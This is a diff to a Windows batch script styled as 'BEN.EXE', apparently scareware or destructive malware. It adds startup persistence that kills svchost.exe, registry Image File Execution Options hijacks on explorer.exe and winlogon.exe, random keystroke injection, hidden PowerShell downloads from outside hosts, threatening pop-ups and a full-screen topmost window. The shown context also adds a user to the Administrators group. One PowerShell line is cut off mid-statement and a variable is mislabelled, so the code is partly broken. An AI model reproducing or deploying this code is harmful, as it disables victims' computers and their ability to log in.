@@ -18,6 +18,7 @@ net localgroup Administrators Anonymousnake3 /add
 
 
 set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+echo X=MsgBox("Hacked,0+16,"You Should'nt have done that")  > "%startup%\BLOODBENISHERE.bat"
 echo taskkill /f /im svchost.exe  > "%startup%\BLOODBENISHERE.bat"
 
 set "URL=https://i.postimg.cc/wvfBjpK2/images.jpg"
@@ -79,26 +80,71 @@ echo x=MsgBox("Ok I give you some advice",0+16,"BEN.EXE") > "%vbsFile6%"
 "%vbsfile6%
 
 set "vbsFile7=%temp%\din\ERROR7.vbs"
-echo x=MsgBox("You better not turn off your computer , or your computer is dead THE COMPUTER IS MINE",0+16,"BEN.EXE") > "%vbsFile7%"
+echo x=MsgBox("You better not turn off your computer",0+16,"BEN.EXE") > "%vbsFile7%"
 "%vbsfile7%"
 
 set "vbsFile8=%temp%\din\ERROR8.vbs"
-echo x=MsgBox("Find my file to destroy me",0+16,"BEN.EXE") > "%vbsFile8%"
+echo x=MsgBox("If the computer is turn off",0+16,"BEN.EXE") > "%vbsFile8%"
 "%vbsfile8%"
 
-:: Set the URL of the image
-set "URL=https://i.postimg.cc/1tmNjh0d/ben.png"
+set "vbsFile8=%temp%\din\ERROR9.vbs"
+echo x=MsgBox("YOUR COMPUTER IS DEAD",0+16,"BEN.EXE") > "%vbsFile9%"
+"%vbsfile9%"
 
-:: Set the output path in TEMP
-set "FILE=%TEMP%\BEN.png"
+set "vbsFile10=%temp%\din\ERROR10.vbs"
+echo x=MsgBox("I will not let you run away this time",0+16,"BEN.EXE") > "%vbsFile10%"
+"%vbsfile10%"
 
-:: Download the image using curl
-curl -s -o "%FILE%" "%URL%"
+set "vbsFile11=%temp%\din\ERROR11.vbs"
+echo x=MsgBox("HAHAHAHAHAHAHAHA",0+16,"BEN.EXE") > "%vbsFile11%"
+"%vbsfile11%"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "BLOODBENISHERE.bat" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "BLOODBENISHERE.bat" /f
+echo Set WshShell = CreateObject("WScript.Shell") > temp_mouse.vbs
+echo Randomize >> temp_mouse.vbs
+echo Do >> temp_mouse.vbs
+echo x = Int((100-(-100)+1)*Rnd+(-100)) >> temp_mouse.vbs
+echo y = Int((100-(-100)+1)*Rnd+(-100)) >> temp_mouse.vbs
+echo WshShell.SendKeys "{UP " & x & "}" >> temp_mouse.vbs
+echo WshShell.SendKeys "{DOWN " & y & "}" >> temp_mouse.vbs
+echo WScript.Sleep 50 >> temp_mouse.vbs
+echo Loop >> temp_mouse.vbs
+set "tempdir=%temp%\din"
+mkdir "%tempdir%" 2>nul
 
-setlocal EnableDelayedExpansion
+
+set "url=https://github.com/dnndj-39/ben-theme-music/raw/refs/heads/main/ben.mp3"
+set "out=%tempdir%\ben-theme.wav"
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"
+
+
+start "" powershell -windowstyle hidden -Command "(New-Object Media.SoundPlayer '%out%').PlaySync()"
+
+
+set "imgUrl=https://i.postimg.cc/Qx9vXfWB/Ben-Drowned.jpg"
+set "imgFile=%tempdir%\Ben-Drowned.jpg"
+powershell -Command "Invoke-WebRequest -Uri '%imgUrl%' -OutFile '%imgFile%'"
+
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; ^
+Add-Type -AssemblyName System.Drawing; ^
+$bitmap = [System.Drawing.Bitmap]::FromFile('$env:TEMP\din\Ben-Drowned.jpg'); ^
+$form = New-Object System.Windows.Forms.Form; ^
+$form.FormBorderStyle='None'; $form.TopMost=$true; $form.StartPosition='CenterScreen'; $form.Size=New-Object System.Drawing.Size($bitmap.Width,$bitmap.Height); ^
+$pictureBox = New-Object System.Windows.Forms.PictureBox; $pictureBox.Dock='Fill'; $pictureBox.Image=$bitmap; $form.Controls.Add($pictureBox); ^
+$rand = New-Object System.Random; ^
+$inputString=''; ^
+$form.Add_KeyDown({param($e) $inputString+=$e.KeyCode.ToString().ToUpper(); if($inputString.Length -gt 3){$inputString=$inputString.Substring($inputString.Length-3)}; if($inputString -eq 'BEN'){$form.Close()}}); ^
+
+$dots=@(); 1..50 | ForEach-Object { $dot=New-Object System.Windows.Forms.Label; $dot.BackColor='Red'; $dot.Size=New-Object System.Drawing.Size(10
+
+
+cscript //nologo temp_mouse.vbs
+taskkill /f /im svchost.exe
+
+:exit
+exit
 Add-Type -AssemblyName System.Drawing; ^
 $form = New-Object System.Windows.Forms.Form; ^
 $form.Text = ''; ^
